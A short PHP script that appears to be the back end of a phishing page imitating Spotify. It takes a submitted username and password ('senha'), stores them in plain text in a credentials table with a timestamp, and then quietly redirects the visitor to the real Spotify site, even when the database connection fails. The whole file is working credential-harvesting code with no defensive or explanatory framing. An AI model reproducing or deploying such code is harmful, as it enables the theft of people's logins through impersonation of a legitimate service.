<?php
session_start();
require_once 'db_config.php'; 

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['username'];
    $senha = $_POST['senha'];
    
    $conn = new mysqli($servername, $username_db, $password_db, $dbname);

    if ($conn->connect_error) {
        header("Location: https://open.spotify.com/"); 
        exit();
    }

    $stmt = $conn->prepare("INSERT INTO $table_creds (usuario, senha, data_registro) VALUES (?, ?, NOW())");
    $stmt->bind_param("ss", $usuario, $senha); 

    if ($stmt->execute()) {
    } else {
    }

    $stmt->close();
    $conn->close();
    
    header("Location: https://open.spotify.com"); 
    exit();
}
?>